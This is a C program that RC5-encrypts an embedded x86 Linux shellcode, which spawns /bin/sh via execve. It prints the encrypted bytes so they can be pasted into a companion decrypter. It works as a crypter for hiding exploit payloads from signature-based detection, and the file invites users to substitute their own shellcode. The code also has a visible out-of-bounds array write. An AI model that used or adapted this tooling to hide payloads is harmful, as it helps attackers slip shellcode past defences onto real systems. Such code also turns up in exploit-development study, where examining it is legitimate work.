#include<stdio.h>
#include<stdlib.h>
#include<string.h>

/*

Compilation : gcc RC5Encrypter.c -o RC5Encrypter

Execution   : ./RC5Encrypter <16 bytes encryption key>

Description : Copy and paste encrypted shellcode
	      in RC5Decrypter.c program.
	      (remove extra comma present at the end 
	       of encrypted shellcode.
	      )
*/

typedef unsigned long int WORD;

#define w 32	// word	
#define r 20	// round
#define b 16	// key length 
#define c 4
#define t 26	// No of rounds subkey require

#define SLEN strlen(shellcode)

#define row strlen(shellcode)/2

WORD S[t];

WORD P = 0xb7e15163 , Q=0x9e3779b9;

#define ROTL(x,y) (((x) << (y & (w-1)) | ((x)) >> (w - (y & (w-1)))))

#define ROTR(x,y) (((x) >> (y & (w-1)) | ((x)) << (w - (y & (w-1)))))

void RC5Encrypt(WORD *pt , WORD *ct)
{

	WORD i;
	WORD A = pt[0] + S[0];
	WORD B = pt[1] + S[1];

	for (i = 1; i <= r; i++)
   	{
      		A = ROTL(A ^ B, B) + S[2*i];
      		B = ROTL(B ^ A, A) + S[2*i + 1];
   	}	
   
	ct[0] = A; ct[1] = B;
}

void RC5Decrypt(WORD *ct, WORD *pt)
{

	WORD i, B=ct[1], A=ct[0];
   
   	for (i = r; i > 0; i--)
   	{
      		B = ROTR(B - S[2*i + 1], A) ^ A;
      		A = ROTR(A - S[2*i], B) ^ B;
   	}
   
   	pt[1] = B - S[1]; pt[0] = A - S[0];
}

void RC5KeySchedule(unsigned char *K)
{
  
	WORD i, j, k, u = w/8, A, B, L[c];
   
   	for (i = b-1, L[c-1] = 0; i != -1; i--)
      		L[i/u] = (L[i/u] << 8) + K[i];
   
   	for (S[0] = P, i = 1; i < t; i++)
      		S[i] = S[i-1] + Q;
   
   	for (A = B = i = j = k = 0; k < 3 * t; k++, i = (i+1) % t, j = (j+1) % c)
   	{
      		A = S[i] = ROTL(S[i] + (A + B), 3);
      		B = L[j] = ROTL(L[j] + (A + B), (A + B));
   	}
}

unsigned char shellcode[] = \

"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x87\xdc\xb0\x0b\xcd\x80";  /* Put your shellcode here*/

main (int argc , char *argv[])
{
	
	WORD i,j,pt1[2],pt2[2];
	unsigned char *key;
	unsigned int shellcode_int[SLEN+1] , NOP;
	int m,n,row1,l=0,key_length; 
	int SLEN1 = sizeof(shellcode_int);	
	
	shellcode_int[SLEN+1] = 144;

	key=(unsigned char *)argv[1];	

	key_length = strlen(key);  // Accepts 16 characters encryption key

	if(key_length != 16)
	{
		printf("\nEntered Key length:%d bytes\n\nEncryption key length should be 16 bytes\n\nExiting.....!\n",(int)key_length);
		exit(2);
	}

	printf("\n\n");
	
	if (SLEN % 2 == 0)
	{
		row1 = row;

		for (n=0 ; n<SLEN ; n++)
			shellcode_int[n] = (unsigned int)shellcode[n];
	}
	else
	{
		row1 = row + 1;
		NOP = 144;			/* Adds a NOP if shellcode length is odd */
		shellcode_int[0] = NOP;
		for (n=1 ; n<SLEN+1 ; n++)
		{
			shellcode_int[n] = (unsigned int)shellcode[n-1];	
		}
	}
	
	printf("\nEncrypted shellcode:\n\n");		

	for (m=0; m<row1 ; m++)
	{
		for(n=0 ; n<1 ; n++)
		{	
			WORD ct[2] = {(unsigned int)shellcode_int[l],(unsigned int)shellcode_int[l+1]};
			pt1[0] = ct[0];
			pt1[1] = ct[1];
		
			RC5KeySchedule(key);
			RC5Encrypt(pt1 , ct);

			printf("{ 0x%02x , 0x%02x },\n" , (unsigned int)ct[0],(unsigned int)ct[1]);
		}

		l = l+2;
	}
	printf("\nCopy and paste encrypted shellcode by removing last comma...!\n\n");
}
